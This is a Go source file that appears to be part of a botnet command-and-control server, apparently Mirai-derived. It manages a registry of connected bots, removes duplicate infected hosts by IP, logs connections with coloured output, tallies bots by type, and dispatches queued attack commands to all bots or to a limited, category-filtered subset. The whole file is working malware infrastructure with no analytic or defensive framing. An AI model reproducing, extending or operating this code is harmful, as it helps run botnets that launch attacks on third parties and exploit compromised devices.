package main

import (
	"fmt"
	"net"
	"sync"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	cntMutex    *sync.Mutex
	ipMap       map[string]*Bot
}

func NewClientList() *ClientList {
	c := &ClientList{
		0,
		0,
		make(map[int]*Bot),
		make(chan *Bot, 128),
		make(chan *Bot, 128),
		make(chan *AttackSend),
		make(chan int, 64),
		make(chan int),
		make(chan int),
		make(chan map[string]int),
		&sync.Mutex{},
		make(map[string]*Bot),
	}
	go c.worker()
	go c.fastCountWorker()
	return c
}

func (this *ClientList) Count() int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	this.cntView <- 0
	return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.distViewReq <- 0
	return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
	this.addQueue <- c
	fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;82mConnect \x1b[38;5;231m] \x1b[38;5;226mBot \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| \x1b[38;5;226mType \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| Version \x1b[38;5;231m: \x1b[38;5;226m%d\r\n", c.conn.RemoteAddr(), c.source, c.version)
}

func (this *ClientList) DelClient(c *Bot) {
	this.delQueue <- c
	fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;196mDisconnect \x1b[38;5;231m] \x1b[38;5;226mBot \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| \x1b[38;5;226mType \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| Version \x1b[38;5;231m: \x1b[38;5;226m%d\r\n", c.conn.RemoteAddr(), c.source, c.version)
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-this.totalCount:
			this.count += delta
			break
		case <-this.cntView:
			this.cntView <- this.count
			break
		}
	}
}

func (this *ClientList) worker() {
	for {
		select {
		case add := <-this.addQueue:
			remoteAddr := add.conn.RemoteAddr().String()
			ip, _, _ := net.SplitHostPort(remoteAddr)

			if oldBot, exists := this.ipMap[ip]; exists {
				fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;226mDuplicated \x1b[38;5;231m] \x1b[38;5;226mBot \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| \x1b[38;5;226mType \x1b[38;5;231m: \x1b[38;5;226m%s \x1b[38;5;231m| Version \x1b[38;5;231m: \x1b[38;5;226m%d\r\n",
					oldBot.conn.RemoteAddr(), oldBot.source, oldBot.version)

				delete(this.clients, oldBot.uid)
				if this.ipMap[ip] == oldBot {
					delete(this.ipMap, ip)
				}
				this.totalCount <- -1
				go oldBot.conn.Close()
			}

			this.uid++
			add.uid = this.uid
			this.clients[add.uid] = add
			this.ipMap[ip] = add
			this.totalCount <- 1
		case del := <-this.delQueue:
			if _, exists := this.clients[del.uid]; !exists {
				break
			}

			delete(this.clients, del.uid)

			remoteAddr := del.conn.RemoteAddr().String()
			ip, _, _ := net.SplitHostPort(remoteAddr)
			if currentBot, exists := this.ipMap[ip]; exists && currentBot.uid == del.uid {
				delete(this.ipMap, ip)
			}

			this.totalCount <- -1
		case atk := <-this.atkQueue:
			if atk.count == -1 {
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			break
		case <-this.cntView:
			this.cntView <- this.count
			break
		case <-this.distViewReq:
			res := make(map[string]int)
			for _, v := range this.clients {
				res[v.source]++
			}
			this.distViewRes <- res
		}
	}
}
